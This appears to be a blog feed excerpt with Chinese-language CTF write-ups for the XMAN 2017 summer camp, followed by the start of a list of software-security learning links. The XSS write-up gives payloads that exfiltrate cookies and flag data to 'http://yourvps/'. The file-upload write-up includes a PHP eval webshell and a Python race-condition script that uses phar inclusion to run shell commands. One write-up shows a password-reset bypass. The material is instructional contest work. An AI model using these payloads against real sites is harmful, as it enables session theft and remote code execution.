    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/</id>
    <published>2017-08-22T10:19:15.000Z</published>
    <updated>2017-08-22T13:50:23.910Z</updated>
    
    <content type="html"><![CDATA[<p>xss<br><a id="more"></a></p>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:33323/</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>查看csp头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot;</div></pre></td></tr></table></figure></p>
<p>这里给出一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">    var head = document.getElementsByTagName(&quot;head&quot;)[0]</div><div class="line">    var n0t = document.createElement(&quot;link&quot;);</div><div class="line">    n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</div><div class="line">    n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie);</div><div class="line">    head.appendChild(n0t);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/9.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;BeVEn_CSP_you_G37_mY_C00K1e&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:43425</div></pre></td></tr></table></figure>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>没有csp头。但没办法直接得到cookie。</p>
<p>另外有一个flag.php，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">only admin can see the flag!</div></pre></td></tr></table></figure></p>
<p>我们先控制admin访问flag.php，之后再发送数据到我们vps上。</p>
<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125;</div></pre></td></tr></table></figure></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xss&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XMAN夏令营-2017-比赛系统-writeup</title>
    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/"/>
    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-比赛系统-writeup/</id>
    <published>2017-08-22T09:31:20.000Z</published>
    <updated>2017-08-22T09:32:44.696Z</updated>
    
    <content type="html"><![CDATA[<p>逻辑问题、任意用户密码重置<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8013</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>有登陆和注册的功能，其中登陆处还有忘记密码。结合url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8013/logic2_regist.php</div><div class="line">http://202.112.51.217:8013/logic2_login.php</div></pre></td></tr></table></figure></p>
<p>猜测应该是逻辑问题。</p>
<p>我们注册一个账号</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/4.png?raw=true" alt=""></p>
<p>对我这个账号而言，其密保问题和答案均为chybeta</p>
<p>接下来看看登陆功能，用刚刚注册的账号登陆，得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">普通用户登录成功,没什么用</div></pre></td></tr></table></figure></p>
<p>那估计要登陆超级用户咯，比如admin。接下来用到忘记密码功能。</p>
<p>我们先输入用户名<code>chybeta</code>，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/5.png?raw=true" alt=""><br>输入密保答案<code>chybeta</code></p>
<p>抓包！</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/6.png?raw=true" alt=""></p>
<p>可以看到有个username字段。我们猜测后端忘记密码的流程是这样的，先从数据库中抽取与用户名相对应的密保问题与答案，之后只要判断我们输入的答案是否和密保答案是否一致即可修改密码，而没有再一次的检查用户名。所以可能存在任意用户密码重置漏洞。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/7.png?raw=true" alt=""></p>
<p>修改username为admin，然后forward掉。然后就可以重置admin的密码了。</p>
<p>重置后登陆得到；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;You_Kookokoko_logic_OK&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;逻辑问题、任意用户密码重置&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XMAN夏令营-2017-babyweb-writeup</title>
    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/"/>
    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-babyweb-writeup/</id>
    <published>2017-08-22T09:31:10.000Z</published>
    <updated>2017-08-22T09:31:33.749Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传、php伪协议、文件包含<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199</div></pre></td></tr></table></figure></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一个图片上传功能（submit），还有一个图片查看功能（view）。点击后可发现url是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=submit</div><div class="line">http://202.112.51.217:8199/index.php?page=view</div></pre></td></tr></table></figure></p>
<p>在submit处有上传功能，对应的页面是upload.php。</p>
<p>猜测有包含漏洞，用php伪协议读取源码，其余类似：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$error=$_FILES[<span class="string">'pic'</span>][<span class="string">'error'</span>];</div><div class="line">$tmpName=$_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$name=$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>];</div><div class="line">$size=$_FILES[<span class="string">'pic'</span>][<span class="string">'size'</span>];</div><div class="line">$type=$_FILES[<span class="string">'pic'</span>][<span class="string">'type'</span>];</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">	<span class="keyword">if</span>($name!==<span class="string">""</span>)</div><div class="line">	&#123;</div><div class="line">		$name1=substr($name,<span class="number">-4</span>);</div><div class="line">		<span class="keyword">if</span>(($name1!==<span class="string">".gif"</span>) <span class="keyword">and</span> ($name1!==<span class="string">".jpg"</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"hehe"</span>;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($type!==<span class="string">"image/jpeg"</span>&amp;&amp;$type!==<span class="string">"image/gif"</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//echo mime_content_type($tmpName);</span></div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(is_uploaded_file($tmpName))&#123;</div><div class="line">			$time=time();</div><div class="line">			$rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">			<span class="keyword">if</span>(!move_uploaded_file($tmpName,$rootpath))&#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script language='JavaScript'&gt;alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script&gt;"</span>;</div><div class="line">				<span class="keyword">exit</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span>&#123;</div><div class="line">				sleep(<span class="number">2</span>);				</div><div class="line">				<span class="keyword">if</span> ($type==<span class="string">'image/jpeg'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromjpeg($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagejpeg($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> <span class="keyword">if</span> ($type==<span class="string">'image/gif'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromgif($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagegif($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				unlink($rootpath);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"图片ID："</span>.$time;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"ERROR"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require</span>(<span class="string">"header.php"</span>);</div><div class="line">	$page=<span class="string">""</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</div><div class="line">	&#123;</div><div class="line">		$page=strtolower($_GET[<span class="string">'page'</span>]);</div><div class="line">		$page=str_replace(<span class="string">"#"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=$page.<span class="string">".php"</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		$page=<span class="string">"main.php"</span>;</div><div class="line">	<span class="keyword">include</span>($page);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在upload.php中，它先将我们上传的文件保存到uploads文件夹下，然后sleep(2)，接着调用imagecreatefromgif等一系列操作。如果我们上传一个包含php代码的图片木马，在经过imagecreatefromgif等一系列操作后，正常情况下其中的php代码会被去掉，也就是说操作过后的图片已经不是图片木马了。不过由于存在sleep(2)，可以利用这个两秒的空隙，利用phar或者zip协议去包含我们上传的还未被删除的图片木马。</p>
<p>基本的流程如下。<br>首先有个k.php，内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @eval($_POST[&apos;test&apos;]) ?&gt;</div></pre></td></tr></table></figure></p>
<p>将它压缩为zip文件，文件名为k.zip。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true" alt=""></p>
<p>然后上传时将其文件名改为k.jpg，类型改为image/jpeg。在上传后访问<code>http://202.112.51.217:8199/uploads/</code>，去获取最新的文件名，然后用协议去包含。如果手动的话时间肯定会超过2s，所以需要用脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.session()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadfile</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/upload.php'</span></div><div class="line">    data = &#123;<span class="string">'title'</span>:<span class="string">'1'</span>,<span class="string">'url'</span>:<span class="string">'1'</span>&#125;</div><div class="line">    files = &#123;<span class="string">'pic'</span>: (<span class="string">'k.jpg'</span>, open(<span class="string">'k.zip'</span>, <span class="string">'rb'</span>), <span class="string">'image/jpeg'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</div><div class="line">    html = s.post(url,files=files)</div><div class="line"></div><div class="line">// get the latest filename</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/uploads/'</span></div><div class="line">    content = s.get(url).content</div><div class="line">    reg = <span class="string">r'href="(.+?\.jpg)"'</span></div><div class="line">    imgre = re.compile(reg)</div><div class="line">    imglist = re.findall(imgre,content)</div><div class="line">    <span class="keyword">return</span> imglist[::<span class="number">-1</span>]      </div><div class="line"></div><div class="line">// use phar getshell</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></div><div class="line">	filename = getfilename()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> filename:</div><div class="line">	    url = <span class="string">'http://202.112.51.217:8199/index.php?page=phar://uploads/'</span> + i +<span class="string">'/k'</span></div><div class="line">	    data = &#123;<span class="string">'test'</span>:<span class="string">'system("ls");'</span>&#125;</div><div class="line">	    content = s.post(url,data=data).content</div><div class="line">	    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</div><div class="line">	        <span class="keyword">print</span> content</div><div class="line">	        exit()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    t1 = threading.Thread(target=uploadfile)</div><div class="line">    t2 = threading.Thread(target=getshell)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/2.png?raw=true" alt=""></p>
<p>之后将getshell里的改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">data = &#123;&apos;test&apos;:&apos;system(&quot;cat xxxxxxxxxasdasf_flag.php&quot;);&apos;&#125;</div><div class="line">content = s.post(url,data=data).content</div><div class="line">if &apos;&#123;&apos; in content:</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/3.png?raw=true" alt=""></p>
<p>因为index.php中对<code>#</code>进行了过滤，所以zip协议用不了。因为zip协议的利用要如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=phar://uploads/filename.jpg#k</div></pre></td></tr></table></figure></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="external">zip或phar协议包含文件</a></li>
<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></li>
<li><a href="http://4o4notfound.org/index.php/archives/31/" target="_blank" rel="external">PHP伪协议分析与应用</a></li>
<li><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE） </a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传、php伪协议、文件包含&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Software-Security-Learning</title>
    <link href="http://yoursite.com/2017/08/19/Software-Security-Learning/"/>
    <id>http://yoursite.com/2017/08/19/Software-Security-Learning/</id>
    <published>2017-08-19T02:16:10.000Z</published>
    <updated>2017-08-24T01:29:47.701Z</updated>
    
    <content type="html"><![CDATA[<p>Software-Security-Learning 学习资料<br>8月24日更新小记：</p>
<ul>
<li>修正某些错误链接</li>
<li>新加浏览器漏洞模块：<a href="https://zhuanlan.zhihu.com/p/28719766" target="_blank" rel="external">浏览器漏洞挖掘思路</a></li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h1 id="Bin-Securiy"><a href="#Bin-Securiy" class="headerlink" title="Bin Securiy"></a>Bin Securiy</h1><ul>
<li><a href="https://github.com/feicong/sec_skills" target="_blank" rel="external">软件安全工程师技能表</a></li>
</ul>
<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
<li><a href="https://github.com/angr/angr" target="_blank" rel="external">Angr：The next-generation binary analysis platform </a></li>
<li><a href="http://www.freebuf.com/sectool/143056.html" target="_blank" rel="external">Angr：一个具有动态符号执行和静态分析的二进制分析工具 </a></li>
<li><a href="http://bestwing.me/2017/03/08/angr-study/" target="_blank" rel="external">angr初探</a></li>
</ul>
<ul>
<li><a href="http://www.freebuf.com/sectool/143123.html" target="_blank" rel="external">Vuzzer自动漏洞挖掘工具简单分析附使用介绍</a></li>
</ul>
<ul>
<li><a href="https://github.com/longld/peda" target="_blank" rel="external">PEDA - Python Exploit Development Assistance for GDB</a></li>
<li><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">pwntools - CTF framework and exploit development library</a></li>
</ul>
<h2 id="Course"><a href="#Course" class="headerlink" title="Course"></a>Course</h2><ul>
<li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="external">Modern Binary Exploitation</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/" target="_blank" rel="external">Linux (x86) Exploit Development Series</a></li>
<li><a href="http://liveoverflow.com/binary_hacking/index.html" target="_blank" rel="external">liveoverflow: Binary Hacking Course</a></li>
<li><a href="https://www.fuzzysecurity.com/tutorials.html" target="_blank" rel="external">Lots of Tutorials</a></li>
</ul>
<h3 id="Hack-The-Virtual-Memory"><a href="#Hack-The-Virtual-Memory" class="headerlink" title="Hack The Virtual Memory"></a>Hack The Virtual Memory</h3><ul>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-c-strings-proc/" target="_blank" rel="external">Hack The Virtual Memory: C strings &amp; /proc</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-python-bytes/" target="_blank" rel="external">Hack The Virtual Memory: Python bytes</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-drawing-the-vm-diagram/" target="_blank" rel="external">Hack the Virtual Memory: drawing the VM diagram</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-malloc-the-heap-the-program-break/" target="_blank" rel="external">Hack the Virtual Memory: malloc, the heap &amp; the program break</a></li>
</ul>
<h3 id="Exploit-writing-tutorial"><a href="#Exploit-writing-tutorial" class="headerlink" title="Exploit writing tutorial"></a>Exploit writing tutorial</h3><ul>
<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">Stack Based Overflows</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" target="_blank" rel="external">Stack Based Overflows – jumping to shellcode</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="external">SEH Based Exploits</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" target="_blank" rel="external">SEH Based Exploits – just another example</a></li>
<li><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/" target="_blank" rel="external">From Exploit to Metasploit – The basics</a></li>
<li><a href="https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" target="_blank" rel="external">How debugger modules &amp; plugins can speed up basic exploit development</a></li>
<li><a href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/" target="_blank" rel="external">Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></li>
<li><a href="https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/" target="_blank" rel="external">Unicode – from 0x00410041 to calc</a></li>
<li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="external">Win32 Egg Hunting</a></li>
<li><a href="https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/" target="_blank" rel="external">Introduction to Win32 shellcoding</a></li>
<li><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" target="_blank" rel="external">Chaining DEP with ROP</a></li>
<li><a href="https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/" target="_blank" rel="external">Heap Spraying Demystified</a></li>
</ul>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><a href="http://www.freebuf.com/articles/system/135685.html" target="_blank" rel="external">Linux中的GOT和PLT到底是个啥？ </a></li>
<li><a href="https://github.com/enzet/symbolic-execution" target="_blank" rel="external">关于符号执行</a></li>
</ul>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="一步一步ROP"><a href="#一步一步ROP" class="headerlink" title="一步一步ROP"></a>一步一步ROP</h3><ul>
<li><a href="http://cb.drops.wiki/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-7551.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a></li>
<li><a href="http://cb.drops.wiki/drops/binary-10638.html" target="_blank" rel="external">一步一步学ROP之gadgets和2free篇</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-11390.html" target="_blank" rel="external">一步一步学ROP之Android ARM 32位篇</a></li>
</ul>
<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><ul>
